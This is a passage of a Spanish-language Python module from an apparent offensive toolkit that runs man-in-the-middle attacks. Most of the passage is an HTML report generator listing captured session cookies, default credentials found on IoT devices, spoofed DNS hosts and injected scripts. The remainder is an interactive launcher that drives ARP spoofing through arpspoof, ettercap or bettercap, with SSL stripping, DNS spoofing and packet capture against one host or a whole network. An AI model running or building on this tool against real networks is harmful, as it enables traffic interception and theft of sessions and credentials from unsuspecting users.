                    f.write("        .file-size { \n")
                    f.write("            font-size: 14px; \n")
                    f.write("            color: #666; \n")
                    f.write("            margin-left: auto; \n")
                    f.write("            padding-left: 15px;\n")
                    f.write("        }\n")
                    f.write("        @media (max-width: 768px) {\n")
                    f.write("            .info-grid, .feature-cards { grid-template-columns: 1fr; }\n")
                    f.write("            .file-card { flex-direction: column; text-align: center; }\n")
                    f.write("            .file-icon { margin: 0 0 10px 0; }\n")
                    f.write("            .file-size { margin: 10px 0 0 0; padding: 0; }\n")
                    f.write("            table { display: block; overflow-x: auto; }\n")
                    f.write("        }\n")
                    f.write("    </style>\n")
                    f.write("</head>\n")
                    f.write("<body>\n")
                    f.write("    <div class=\"container\">\n")
                    f.write("        <div class=\"header\">\n")
                    f.write("            <h1>Informe de Ataque MITM</h1>\n")
                    f.write("            <p>Resultados detallados del ataque Man-in-the-Middle</p>\n")
                    f.write("        </div>\n")
                    
                    f.write("        <div class=\"section\">\n")
                    f.write("            <h2>Información General</h2>\n")
                    f.write("            <div class=\"info-grid\">\n")
                    
                    f.write("                <div class=\"info-card\">\n")
                    f.write("                    <div class=\"icon\">I</div>\n")
                    f.write("                    <div class=\"content\">\n")
                    f.write("                        <div class=\"label\">Interfaz</div>\n")
                    f.write("                        <div class=\"value\">" + results['interface'] + "</div>\n")
                    f.write("                    </div>\n")
                    f.write("                </div>\n")
                    
                    f.write("                <div class=\"info-card\">\n")
                    f.write("                    <div class=\"icon\">G</div>\n")
                    f.write("                    <div class=\"content\">\n")
                    f.write("                        <div class=\"label\">Gateway IP</div>\n")
                    f.write("                        <div class=\"value\">" + results['gateway_ip'] + "</div>\n")
                    f.write("                    </div>\n")
                    f.write("                </div>\n")
                    
                    f.write("                <div class=\"info-card\">\n")
                    f.write("                    <div class=\"icon\">T</div>\n")
                    f.write("                    <div class=\"content\">\n")
                    f.write("                        <div class=\"label\">Target IP</div>\n")
                    f.write("                        <div class=\"value\">" + (results['target_ip'] or 'Toda la red') + "</div>\n")
                    f.write("                    </div>\n")
                    f.write("                </div>\n")
                    
                    f.write("                <div class=\"info-card\">\n")
                    f.write("                    <div class=\"icon\">S</div>\n")
                    f.write("                    <div class=\"content\">\n")
                    f.write("                        <div class=\"label\">Inicio</div>\n")
                    f.write("                        <div class=\"value\">" + (results['start_time'] or 'N/A') + "</div>\n")
                    f.write("                    </div>\n")
                    f.write("                </div>\n")
                    
                    f.write("                <div class=\"info-card\">\n")
                    f.write("                    <div class=\"icon\">E</div>\n")
                    f.write("                    <div class=\"content\">\n")
                    f.write("                        <div class=\"label\">Fin</div>\n")
                    f.write("                        <div class=\"value\">" + (results['end_time'] or 'N/A') + "</div>\n")
                    f.write("                    </div>\n")
                    f.write("                </div>\n")
                    
                    f.write("                <div class=\"info-card\">\n")
                    f.write("                    <div class=\"icon\">D</div>\n")
                    f.write("                    <div class=\"content\">\n")
                    f.write("                        <div class=\"label\">Duración</div>\n")
                    f.write(f"                        <div class=\"value\">{results['duration']:.2f} segundos</div>\n")
                    f.write("                    </div>\n")
                    f.write("                </div>\n")
                    
                    f.write("            </div>\n")
                    f.write("        </div>\n")
                    
                    f.write("        <div class=\"section\">\n")
                    f.write("            <h2>Configuración</h2>\n")
                    f.write("            <div class=\"feature-cards\">\n")
                    
                    # SSL Strip
                    f.write("                <div class=\"feature-card " + ("enabled" if results['ssl_strip'] else "disabled") + "\">\n")
                    f.write("                    <div class=\"feature-icon\">SSL</div>\n")
                    f.write("                    <div class=\"feature-name\">SSL Strip</div>\n")
                    f.write("                    <div class=\"feature-status\">" + ("Habilitado" if results['ssl_strip'] else "Deshabilitado") + "</div>\n")
                    f.write("                </div>\n")
                    
                    # DNS Spoof
                    f.write("                <div class=\"feature-card " + ("enabled" if results['dns_spoof'] else "disabled") + "\">\n")
                    f.write("                    <div class=\"feature-icon\">DNS</div>\n")
                    f.write("                    <div class=\"feature-name\">DNS Spoof</div>\n")
                    f.write("                    <div class=\"feature-status\">" + ("Habilitado" if results['dns_spoof'] else "Deshabilitado") + "</div>\n")
                    f.write("                </div>\n")
                    
                    # Packet Capture
                    f.write("                <div class=\"feature-card " + ("enabled" if results['packet_capture'] else "disabled") + "\">\n")
                    f.write("                    <div class=\"feature-icon\">PKT</div>\n")
                    f.write("                    <div class=\"feature-name\">Captura de paquetes</div>\n")
                    f.write("                    <div class=\"feature-status\">" + ("Habilitado" if results['packet_capture'] else "Deshabilitado") + "</div>\n")
                    f.write("                </div>\n")
                    
                    # HTTPS Inspection
                    if 'https_inspection' in results:
                        f.write("                <div class=\"feature-card " + ("enabled" if results['https_inspection'] else "disabled") + "\">\n")
                        f.write("                    <div class=\"feature-icon\">HTTPS</div>\n")
                        f.write("                    <div class=\"feature-name\">Inspección HTTPS</div>\n")
                        f.write("                    <div class=\"feature-status\">" + ("Habilitado" if results['https_inspection'] else "Deshabilitado") + "</div>\n")
                        f.write("                </div>\n")
                    
                    # Script Injection Detection
                    if 'script_injection_detection' in results:
                        f.write("                <div class=\"feature-card " + ("enabled" if results['script_injection_detection'] else "disabled") + "\">\n")
                        f.write("                    <div class=\"feature-icon\">SCR</div>\n")
                        f.write("                    <div class=\"feature-name\">Detección de inyección de scripts</div>\n")
                        f.write("                    <div class=\"feature-status\">" + ("Habilitado" if results['script_injection_detection'] else "Deshabilitado") + "</div>\n")
                        f.write("                </div>\n")
                    
                    # API Fuzzing
                    if 'api_fuzzing' in results:
                        f.write("                <div class=\"feature-card " + ("enabled" if results['api_fuzzing'] else "disabled") + "\">\n")
                        f.write("                    <div class=\"feature-icon\">API</div>\n")
                        f.write("                    <div class=\"feature-name\">API Fuzzing</div>\n")
                        f.write("                    <div class=\"feature-status\">" + ("Habilitado" if results['api_fuzzing'] else "Deshabilitado") + "</div>\n")
                        f.write("                </div>\n")
                    
                    # Session Hijacking Detection
                    if 'session_hijacking_detection' in results:
                        f.write("                <div class=\"feature-card " + ("enabled" if results['session_hijacking_detection'] else "disabled") + "\">\n")
                        f.write("                    <div class=\"feature-icon\">SES</div>\n")
                        f.write("                    <div class=\"feature-name\">Detección de secuestro de sesión</div>\n")
                        f.write("                    <div class=\"feature-status\">" + ("Habilitado" if results['session_hijacking_detection'] else "Deshabilitado") + "</div>\n")
                        f.write("                </div>\n")
                    
                    # MQTT/CoAP Scan
                    if 'mqtt_coap_scan' in results:
                        f.write("                <div class=\"feature-card " + ("enabled" if results['mqtt_coap_scan'] else "disabled") + "\">\n")
                        f.write("                    <div class=\"feature-icon\">IOT</div>\n")
                        f.write("                    <div class=\"feature-name\">Escaneo MQTT/CoAP</div>\n")
                        f.write("                    <div class=\"feature-status\">" + ("Habilitado" if results['mqtt_coap_scan'] else "Deshabilitado") + "</div>\n")
                        f.write("                </div>\n")
                    
                    # Default Credential Testing
                    if 'default_credential_testing' in results:
                        f.write("                <div class=\"feature-card " + ("enabled" if results['default_credential_testing'] else "disabled") + "\">\n")
                        f.write("                    <div class=\"feature-icon\">CRED</div>\n")
                        f.write("                    <div class=\"feature-name\">Prueba de credenciales por defecto</div>\n")
                        f.write("                    <div class=\"feature-status\">" + ("Habilitado" if results['default_credential_testing'] else "Deshabilitado") + "</div>\n")
                        f.write("                </div>\n")
                    
                    # Firmware Analysis
                    if 'firmware_analysis' in results:
                        f.write("                <div class=\"feature-card " + ("enabled" if results['firmware_analysis'] else "disabled") + "\">\n")
                        f.write("                    <div class=\"feature-icon\">FW</div>\n")
                        f.write("                    <div class=\"feature-name\">Análisis de firmware</div>\n")
                        f.write("                    <div class=\"feature-status\">" + ("Habilitado" if results['firmware_analysis'] else "Deshabilitado") + "</div>\n")
                        f.write("                </div>\n")
                    
                    # Container Security Scan
                    if 'container_security_scan' in results:
                        f.write("                <div class=\"feature-card " + ("enabled" if results['container_security_scan'] else "disabled") + "\">\n")
                        f.write("                    <div class=\"feature-icon\">CNT</div>\n")
                        f.write("                    <div class=\"feature-name\">Escaneo de seguridad de contenedores</div>\n")
                        f.write("                    <div class=\"feature-status\">" + ("Habilitado" if results['container_security_scan'] else "Deshabilitado") + "</div>\n")
                        f.write("                </div>\n")
                    
                    # Cloud Misconfiguration Scan
                    if 'cloud_misconfiguration_scan' in results:
                        f.write("                <div class=\"feature-card " + ("enabled" if results['cloud_misconfiguration_scan'] else "disabled") + "\">\n")
                        f.write("                    <div class=\"feature-icon\">CLD</div>\n")
                        f.write("                    <div class=\"feature-name\">Escaneo de configuraciones erróneas en la nube</div>\n")
                        f.write("                    <div class=\"feature-status\">" + ("Habilitado" if results['cloud_misconfiguration_scan'] else "Deshabilitado") + "</div>\n")
                        f.write("                </div>\n")
                    
                    # VLAN Hopping Test
                    if 'vlan_hopping_test' in results:
                        f.write("                <div class=\"feature-card " + ("enabled" if results['vlan_hopping_test'] else "disabled") + "\">\n")
                        f.write("                    <div class=\"feature-icon\">VLAN</div>\n")
                        f.write("                    <div class=\"feature-name\">Prueba de VLAN Hopping</div>\n")
                        f.write("                    <div class=\"feature-status\">" + ("Habilitado" if results['vlan_hopping_test'] else "Deshabilitado") + "</div>\n")
                        f.write("                </div>\n")
                    
                    f.write("            </div>\n")
                    f.write("        </div>\n")
                    
                    if results['dns_spoof'] and results['dns_spoof_hosts']:
                        f.write("        <div class=\"section\">\n")
                        f.write("            <h2>Hosts DNS Spoof</h2>\n")
                        
                        # Versión moderna con tarjetas
                        f.write("            <div class=\"dns-hosts-grid\" style=\"display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px;\">\n")
                        
                        for domain, ip in results['dns_spoof_hosts'].items():
                            f.write("                <div class=\"dns-host-card\" style=\"background: white; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); border-left: 4px solid var(--secondary-color);\">\n")
                            f.write(f"                    <div style=\"font-weight: 600; color: var(--primary-color); margin-bottom: 8px;\">{domain}</div>\n")
                            f.write(f"                    <div style=\"color: #666; font-family: monospace; background: #f5f5f5; padding: 5px; border-radius: 4px;\">{ip}</div>\n")
                            f.write("                </div>\n")
                        
                        f.write("            </div>\n")
                        
                        # Versión alternativa con tabla para compatibilidad
                        f.write("            <table style=\"margin-top: 20px; display: none;\">\n")
                        f.write("                <tr>\n")
                        f.write("                    <th>Dominio</th>\n")
                        f.write("                    <th>IP</th>\n")
                        f.write("                </tr>\n")
                        
                        for domain, ip in results['dns_spoof_hosts'].items():
                            f.write("                <tr>\n")
                            f.write(f"                    <td>{domain}</td>\n")
                            f.write(f"                    <td>{ip}</td>\n")
                            f.write("                </tr>\n")
                        
                        f.write("            </table>\n")
                        f.write("        </div>\n")
                    
                    f.write("        <div class=\"section\">\n")
                    f.write("            <h2>Archivos Generados</h2>\n")
                    f.write("            <div class=\"files-container\">\n")
                    
                    file_count = 0
                    
                    if results['packet_capture'] and results['capture_file']:
                        file_count += 1
                        f.write("                <div class=\"file-card\">\n")
                        f.write("                    <div class=\"file-icon\">P</div>\n")
                        f.write("                    <div class=\"file-details\">\n")
                        f.write("                        <div class=\"file-type\">Captura de paquetes</div>\n")
                        f.write(f"                        <div class=\"file-path\">{results['capture_file']}</div>\n")
                        f.write("                    </div>\n")
                        
                        if 'capture_file_size' in results:
                            f.write(f"                    <div class=\"file-size\">{results['capture_file_size']} bytes</div>\n")
                        else:
                            f.write("                    <div class=\"file-size\">N/A</div>\n")
                        
                        f.write("                </div>\n")
                    
                    if 'sslstrip_log' in results:
                        file_count += 1
                        f.write("                <div class=\"file-card\">\n")
                        f.write("                    <div class=\"file-icon\">S</div>\n")
                        f.write("                    <div class=\"file-details\">\n")
                        f.write("                        <div class=\"file-type\">Log de SSL Strip</div>\n")
                        f.write(f"                        <div class=\"file-path\">{results['sslstrip_log']}</div>\n")
                        f.write("                    </div>\n")
                        
                        if 'sslstrip_log_size' in results:
                            f.write(f"                    <div class=\"file-size\">{results['sslstrip_log_size']} bytes</div>\n")
                        else:
                            f.write("                    <div class=\"file-size\">N/A</div>\n")
                        
                        f.write("                </div>\n")
                    
                    if file_count == 0:
                        f.write("                <div style=\"text-align: center; padding: 20px; color: #666; background: #f9f9f9; border-radius: 8px;\">\n")
                        f.write("                    <p>No se han generado archivos durante este ataque.</p>\n")
                        f.write("                </div>\n")
                    
                    f.write("            </div>\n")
                    
                    # Versión alternativa con tabla para compatibilidad
                    f.write("            <table style=\"display: none;\">\n")
                    f.write("                <tr>\n")
                    f.write("                    <th>Tipo</th>\n")
                    f.write("                    <th>Ruta</th>\n")
                    f.write("                    <th>Tamaño</th>\n")
                    f.write("                </tr>\n")
                    
                    if results['packet_capture'] and results['capture_file']:
                        f.write("                <tr>\n")
                        f.write("                    <td>Captura de paquetes</td>\n")
                        f.write(f"                    <td>{results['capture_file']}</td>\n")
                        
                        if 'capture_file_size' in results:
                            f.write(f"                    <td>{results['capture_file_size']} bytes</td>\n")
                        else:
                            f.write("                    <td>N/A</td>\n")
                        
                        f.write("                </tr>\n")
                    
                    if 'sslstrip_log' in results:
                        f.write("                <tr>\n")
                        f.write("                    <td>Log de SSL Strip</td>\n")
                        f.write(f"                    <td>{results['sslstrip_log']}</td>\n")
                        
                        if 'sslstrip_log_size' in results:
                            f.write(f"                    <td>{results['sslstrip_log_size']} bytes</td>\n")
                        else:
                            f.write("                    <td>N/A</td>\n")
                        
                        f.write("                </tr>\n")
                    
                    f.write("            </table>\n")
                    f.write("        </div>\n")
                    
                    # Sección de dispositivos IoT detectados
                    if 'iot_devices' in results and results['iot_devices']:
                        f.write("        <div class=\"section\">\n")
                        f.write("            <h2>Dispositivos IoT Detectados</h2>\n")
                        f.write("            <div class=\"iot-devices-grid\" style=\"display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px;\">\n")
                        
                        for device in results['iot_devices']:
                            f.write("                <div class=\"iot-device-card\" style=\"background: white; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); border-left: 4px solid var(--secondary-color);\">\n")
                            f.write(f"                    <div style=\"font-weight: 600; color: var(--primary-color); margin-bottom: 8px;\">{device.get('ip', 'N/A')}</div>\n")
                            f.write(f"                    <div style=\"color: #666; margin-bottom: 5px;\">Protocolo: {device.get('protocol', 'N/A')}</div>\n")
                            f.write(f"                    <div style=\"color: #666; margin-bottom: 5px;\">Puerto: {device.get('port', 'N/A')}</div>\n")
                            if 'vendor' in device:
                                f.write(f"                    <div style=\"color: #666; margin-bottom: 5px;\">Fabricante: {device.get('vendor', 'N/A')}</div>\n")
                            if 'model' in device:
                                f.write(f"                    <div style=\"color: #666; margin-bottom: 5px;\">Modelo: {device.get('model', 'N/A')}</div>\n")
                            f.write("                </div>\n")
                        
                        f.write("            </div>\n")
                        f.write("        </div>\n")
                    
                    # Sección de dispositivos IoT vulnerables
                    if 'vulnerable_iot_devices' in results and results['vulnerable_iot_devices']:
                        f.write("        <div class=\"section\">\n")
                        f.write("            <h2>Dispositivos IoT Vulnerables</h2>\n")
                        f.write("            <div class=\"vulnerable-devices-grid\" style=\"display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px;\">\n")
                        
                        for device in results['vulnerable_iot_devices']:
                            f.write("                <div class=\"vulnerable-device-card\" style=\"background: white; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); border-left: 4px solid var(--danger-color);\">\n")
                            f.write(f"                    <div style=\"font-weight: 600; color: var(--danger-color); margin-bottom: 8px;\">{device.get('ip', 'N/A')}</div>\n")
                            f.write(f"                    <div style=\"color: #666; margin-bottom: 5px;\">Protocolo: {device.get('protocol', 'N/A')}</div>\n")
                            f.write(f"                    <div style=\"color: #666; margin-bottom: 5px;\">Puerto: {device.get('port', 'N/A')}</div>\n")
                            if 'vulnerability' in device:
                                f.write(f"                    <div style=\"color: #d32f2f; margin-bottom: 5px;\">Vulnerabilidad: {device.get('vulnerability', 'N/A')}</div>\n")
                            if 'credentials' in device:
                                f.write(f"                    <div style=\"color: #d32f2f; margin-bottom: 5px;\">Credenciales: {device.get('credentials', 'N/A')}</div>\n")
                            f.write("                </div>\n")
                        
                        f.write("            </div>\n")
                        f.write("        </div>\n")
                    
                    # Sección de inyecciones de scripts detectadas
                    if 'detected_script_injections' in results and results['detected_script_injections']:
                        f.write("        <div class=\"section\">\n")
                        f.write("            <h2>Inyecciones de Scripts Detectadas</h2>\n")
                        f.write("            <div class=\"script-injections-container\">\n")
                        
                        for injection in results['detected_script_injections']:
                            f.write("                <div class=\"script-injection-card\" style=\"background: white; border-radius: 8px; padding: 15px; margin-bottom: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); border-left: 4px solid var(--warning-color);\">\n")
                            f.write(f"                    <div style=\"font-weight: 600; color: var(--warning-color); margin-bottom: 8px;\">URL: {injection.get('url', 'N/A')}</div>\n")
                            f.write(f"                    <div style=\"color: #666; margin-bottom: 5px;\">Tipo: {injection.get('type', 'N/A')}</div>\n")
                            f.write(f"                    <div style=\"color: #666; margin-bottom: 5px;\">Timestamp: {injection.get('timestamp', 'N/A')}</div>\n")
                            if 'script' in injection:
                                f.write("                    <div style=\"margin-top: 10px;\">\n")
                                f.write("                        <div style=\"font-weight: 500; margin-bottom: 5px;\">Script:</div>\n")
                                f.write(f"                        <pre style=\"background: #f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto; font-family: monospace; font-size: 12px;\">{injection.get('script', 'N/A')}</pre>\n")
                                f.write("                    </div>\n")
                            f.write("                </div>\n")
                        
                        f.write("            </div>\n")
                        f.write("        </div>\n")
                    
                    # Sección de sesiones detectadas
                    if 'detected_sessions' in results and results['detected_sessions']:
                        f.write("        <div class=\"section\">\n")
                        f.write("            <h2>Sesiones Detectadas</h2>\n")
                        f.write("            <div class=\"sessions-grid\" style=\"display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px;\">\n")
                        
                        for session in results['detected_sessions']:
                            f.write("                <div class=\"session-card\" style=\"background: white; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); border-left: 4px solid var(--secondary-color);\">\n")
                            f.write(f"                    <div style=\"font-weight: 600; color: var(--primary-color); margin-bottom: 8px;\">IP: {session.get('ip', 'N/A')}</div>\n")
                            f.write(f"                    <div style=\"color: #666; margin-bottom: 5px;\">Cookie: {session.get('cookie', 'N/A')}</div>\n")
                            f.write(f"                    <div style=\"color: #666; margin-bottom: 5px;\">Dominio: {session.get('domain', 'N/A')}</div>\n")
                            f.write(f"                    <div style=\"color: #666; margin-bottom: 5px;\">Timestamp: {session.get('timestamp', 'N/A')}</div>\n")
                            if 'vulnerable' in session and session['vulnerable']:
                                f.write("                    <div style=\"color: #d32f2f; font-weight: 500; margin-top: 8px;\">¡Vulnerable al secuestro de sesión!</div>\n")
                            f.write("                </div>\n")
                        
                        f.write("            </div>\n")
                        f.write("        </div>\n")
                    
                    # Sección de informe de cumplimiento
                    if 'compliance_report' in results and results['compliance_report']:
                        f.write("        <div class=\"section\">\n")
                        f.write("            <h2>Informe de Cumplimiento</h2>\n")
                        f.write("            <div class=\"compliance-report-container\" style=\"background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);\">\n")
                        
                        compliance_report = results['compliance_report']
                        f.write(f"                <div style=\"font-weight: 600; color: var(--primary-color); margin-bottom: 15px;\">Tipo: {results.get('compliance_report_type', 'N/A')}</div>\n")
                        
                        if 'summary' in compliance_report:
                            f.write(f"                <div style=\"margin-bottom: 20px;\">\n")
                            f.write(f"                    <div style=\"font-weight: 500; margin-bottom: 5px;\">Resumen:</div>\n")
                            f.write(f"                    <div style=\"color: #666;\">{compliance_report['summary']}</div>\n")
                            f.write(f"                </div>\n")
                        
                        if 'findings' in compliance_report and compliance_report['findings']:
                            f.write("                <div style=\"margin-bottom: 20px;\">\n")
                            f.write("                    <div style=\"font-weight: 500; margin-bottom: 10px;\">Hallazgos:</div>\n")
                            f.write("                    <ul style=\"margin: 0; padding-left: 20px;\">\n")
                            
                            for finding in compliance_report['findings']:
                                f.write(f"                        <li style=\"margin-bottom: 8px;\">\n")
                                f.write(f"                            <div style=\"font-weight: 500;\">{finding.get('title', 'N/A')}</div>\n")
                                f.write(f"                            <div style=\"color: #666;\">{finding.get('description', 'N/A')}</div>\n")
                                if 'severity' in finding:
                                    severity_color = '#d32f2f' if finding['severity'] == 'Alta' else '#f57c00' if finding['severity'] == 'Media' else '#7cb342'
                                    f.write(f"                            <div style=\"color: {severity_color}; font-weight: 500; margin-top: 5px;\">Severidad: {finding.get('severity', 'N/A')}</div>\n")
                                f.write(f"                        </li>\n")
                            
                            f.write("                    </ul>\n")
                            f.write("                </div>\n")
                        
                        if 'recommendations' in compliance_report and compliance_report['recommendations']:
                            f.write("                <div>\n")
                            f.write("                    <div style=\"font-weight: 500; margin-bottom: 10px;\">Recomendaciones:</div>\n")
                            f.write("                    <ul style=\"margin: 0; padding-left: 20px;\">\n")
                            
                            for recommendation in compliance_report['recommendations']:
                                f.write(f"                        <li style=\"margin-bottom: 5px;\">{recommendation}</li>\n")
                            
                            f.write("                    </ul>\n")
                            f.write("                </div>\n")
                        
                        f.write("            </div>\n")
                        f.write("        </div>\n")
                    
                    # Sección de visualización de vectores de ataque
                    if 'attack_vector_visualization_html' in results and results['attack_vector_visualization_html']:
                        f.write("        <div class=\"section\">\n")
                        f.write("            <h2>Visualización de Vectores de Ataque</h2>\n")
                        f.write("            <div class=\"attack-vector-container\" style=\"background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);\">\n")
                        f.write(results['attack_vector_visualization_html'])
                        f.write("            </div>\n")
                        f.write("        </div>\n")
                    
                    # Sección de recomendaciones automáticas
                    if 'recommendations' in results and results['recommendations']:
                        f.write("        <div class=\"section\">\n")
                        f.write("            <h2>Recomendaciones Automáticas</h2>\n")
                        f.write("            <div class=\"recommendations-container\" style=\"background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);\">\n")
                        
                        if 'general' in results['recommendations'] and results['recommendations']['general']:
                            f.write("                <div style=\"margin-bottom: 20px;\">\n")
                            f.write("                    <div style=\"font-weight: 600; color: var(--primary-color); margin-bottom: 10px;\">Recomendaciones Generales</div>\n")
                            f.write("                    <ul style=\"margin: 0; padding-left: 20px;\">\n")
                            
                            for recommendation in results['recommendations']['general']:
                                f.write(f"                        <li style=\"margin-bottom: 5px;\">{recommendation}</li>\n")
                            
                            f.write("                    </ul>\n")
                            f.write("                </div>\n")
                        
                        if 'specific' in results['recommendations']:
                            for category, recommendations in results['recommendations']['specific'].items():
                                if recommendations:
                                    f.write(f"                <div style=\"margin-bottom: 20px;\">\n")
                                    f.write(f"                    <div style=\"font-weight: 600; color: var(--primary-color); margin-bottom: 10px;\">Recomendaciones para {category}</div>\n")
                                    f.write("                    <ul style=\"margin: 0; padding-left: 20px;\">\n")
                                    
                                    for recommendation in recommendations:
                                        f.write(f"                        <li style=\"margin-bottom: 5px;\">{recommendation}</li>\n")
                                    
                                    f.write("                    </ul>\n")
                                    f.write("                </div>\n")
                        
                        f.write("            </div>\n")
                        f.write("        </div>\n")
                    
                    # Pie de página
                    f.write("        <div style=\"text-align: center; margin-top: 30px; padding: 20px; color: #666; font-size: 14px;\">\n")
                    f.write("            <p>Informe generado por UnityDex - " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "</p>\n")
                    f.write("        </div>\n")
                    
                    f.write("    </div>\n")
                    f.write("</body>\n")
                    f.write("</html>\n")
            else:
                logger.error(f"Formato de informe no soportado: {format}")
                return False
            
            logger.info(f"Informe generado en {output_file}")
            return True
        except Exception as e:
            logger.error(f"Error al generar informe: {str(e)}")
            return False

# Función para realizar un ataque MITM
def perform_mitm_attack(interface, gateway_ip, target_ip=None, attack_type='arpspoof', ssl_strip=False, dns_spoof=False, dns_spoof_hosts=None, packet_capture=False, capture_filter=None, duration=None):
    '''
    Realiza un ataque MITM
    '''
    # Validar parámetros
    if not interface or not gateway_ip:
        logger.error("Faltan parámetros obligatorios (interface, gateway_ip)")
        return None
    
    # Configurar ataque
    mitm = MITMAttack({
        'interface': interface,
        'gateway_ip': gateway_ip,
        'target_ip': target_ip,
        'output_dir': 'results',
        'ssl_strip': ssl_strip,
        'dns_spoof': dns_spoof,
        'dns_spoof_hosts': dns_spoof_hosts or {},
        'packet_capture': packet_capture,
        'capture_filter': capture_filter,
        'verbose': True
    })
    
    # Iniciar ataque
    success = mitm.start_attack(attack_type)
    if not success:
        logger.error("Error al iniciar el ataque MITM")
        return None
    
    # Esperar duración si se especifica
    if duration:
        logger.info(f"Ataque en curso durante {duration} segundos...")
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            logger.info("Ataque interrumpido por el usuario")
        
        # Detener ataque
        mitm.stop_attack()
    else:
        logger.info("Ataque en curso. Presione Ctrl+C para detener.")
        try:
            # Mantener ataque en curso hasta que el usuario lo detenga
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("Ataque interrumpido por el usuario")
            
            # Detener ataque
            mitm.stop_attack()
    
    # Obtener resultados
    results = mitm.get_results()
    
    # Guardar resultados
    mitm.save_results()
    
    # Generar informe
    mitm.generate_report(format='html')
    
    return results

# Función principal para pruebas
def main():
    print(f"{COLORS['HEADER']}Módulo de ataques MITM para RedTrigger{COLORS['ENDC']}")
    
    # Verificar privilegios de root
    if not check_root_privileges():
        print(f"{COLORS['FAIL']}Se requieren privilegios de root para realizar ataques MITM{COLORS['ENDC']}")
        return
    
    # Obtener interfaces de red
    interfaces = get_interface_info()
    
    if not interfaces:
        print(f"{COLORS['FAIL']}No se encontraron interfaces de red{COLORS['ENDC']}")
        return
    
    # Mostrar interfaces disponibles
    print(f"\n{COLORS['BOLD']}Interfaces de red disponibles:{COLORS['ENDC']}")
    for i, interface in enumerate(interfaces.keys(), 1):
        print(f"{i}. {interface}")
    
    # Solicitar interfaz
    interface_option = input(f"\n{COLORS['BOLD']}Seleccione una interfaz (1-{len(interfaces)}): {COLORS['ENDC']}")
    
    try:
        interface_index = int(interface_option) - 1
        if interface_index < 0 or interface_index >= len(interfaces):
            print(f"{COLORS['FAIL']}Opción no válida{COLORS['ENDC']}")
            return
        
        interface = list(interfaces.keys())[interface_index]
    except:
        print(f"{COLORS['FAIL']}Opción no válida{COLORS['ENDC']}")
        return
    
    # Solicitar gateway IP
    gateway_ip = input(f"{COLORS['BOLD']}Introduzca la IP del gateway: {COLORS['ENDC']}")
    
    if not gateway_ip:
        print(f"{COLORS['FAIL']}No se ha especificado la IP del gateway{COLORS['ENDC']}")
        return
    
    # Solicitar target IP (opcional)
    target_ip = input(f"{COLORS['BOLD']}Introduzca la IP del objetivo (dejar en blanco para toda la red): {COLORS['ENDC']}")
    
    # Solicitar tipo de ataque
    print(f"\n{COLORS['BOLD']}Tipos de ataque disponibles:{COLORS['ENDC']}")
    print("1. ARP Spoofing (arpspoof)")
    print("2. Ettercap")
    print("3. Bettercap")
    
    attack_option = input(f"\n{COLORS['BOLD']}Seleccione un tipo de ataque (1-3): {COLORS['ENDC']}")
    
    attack_types = ['arpspoof', 'ettercap', 'bettercap']
    
    try:
        attack_index = int(attack_option) - 1
        if attack_index < 0 or attack_index >= len(attack_types):
            print(f"{COLORS['FAIL']}Opción no válida{COLORS['ENDC']}")
            return
        
        attack_type = attack_types[attack_index]
    except:
        print(f"{COLORS['FAIL']}Opción no válida{COLORS['ENDC']}")
        return
    
    # Solicitar opciones adicionales
    ssl_strip = input(f"{COLORS['BOLD']}¿Habilitar SSL Strip? (s/n): {COLORS['ENDC']}").lower() == 's'
    dns_spoof = input(f"{COLORS['BOLD']}¿Habilitar DNS Spoofing? (s/n): {COLORS['ENDC']}").lower() == 's'
    
    dns_spoof_hosts = {}
    if dns_spoof:
        print(f"\n{COLORS['BOLD']}Introduzca los hosts para DNS Spoofing (dejar en blanco para terminar):{COLORS['ENDC']}")
        while True:
            domain = input("Dominio: ")
            if not domain:
                break
            
            ip = input("IP: ")
            if not ip:
                break
            
            dns_spoof_hosts[domain] = ip
    
    packet_capture = input(f"{COLORS['BOLD']}¿Habilitar captura de paquetes? (s/n): {COLORS['ENDC']}").lower() == 's'
    
    capture_filter = None
    if packet_capture:
        capture_filter = input(f"{COLORS['BOLD']}Filtro de captura (dejar en blanco para capturar todo): {COLORS['ENDC']}")
    
    # Solicitar duración del ataque
    duration_str = input(f"{COLORS['BOLD']}Duración del ataque en segundos (dejar en blanco para manual): {COLORS['ENDC']}")
    duration = None
    
    if duration_str:
        try:
            duration = int(duration_str)
            if duration <= 0:
                print(f"{COLORS['WARNING']}Duración no válida, se usará modo manual{COLORS['ENDC']}")
                duration = None
        except:
            print(f"{COLORS['WARNING']}Duración no válida, se usará modo manual{COLORS['ENDC']}")
    
    # Crear directorio de resultados
    output_dir = 'results'
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    # Iniciar ataque
    print(f"\n{COLORS['GREEN']}Iniciando ataque MITM en interfaz {interface}{COLORS['ENDC']}")
    print(f"Gateway: {gateway_ip}")
    print(f"Objetivo: {target_ip or 'Toda la red'}")
    print(f"Tipo de ataque: {attack_type}")
    print(f"SSL Strip: {'Habilitado' if ssl_strip else 'Deshabilitado'}")
    print(f"DNS Spoof: {'Habilitado' if dns_spoof else 'Deshabilitado'}")
    print(f"Captura de paquetes: {'Habilitado' if packet_capture else 'Deshabilitado'}")
    
    if duration:
        print(f"Duración: {duration} segundos")
    else:
        print("Duración: Manual (Ctrl+C para detener)")
    
    print("\nPresione Ctrl+C para detener el ataque")
    
    try:
        results = perform_mitm_attack(
            interface=interface,
            gateway_ip=gateway_ip,
            target_ip=target_ip,
            attack_type=attack_type,
            ssl_strip=ssl_strip,
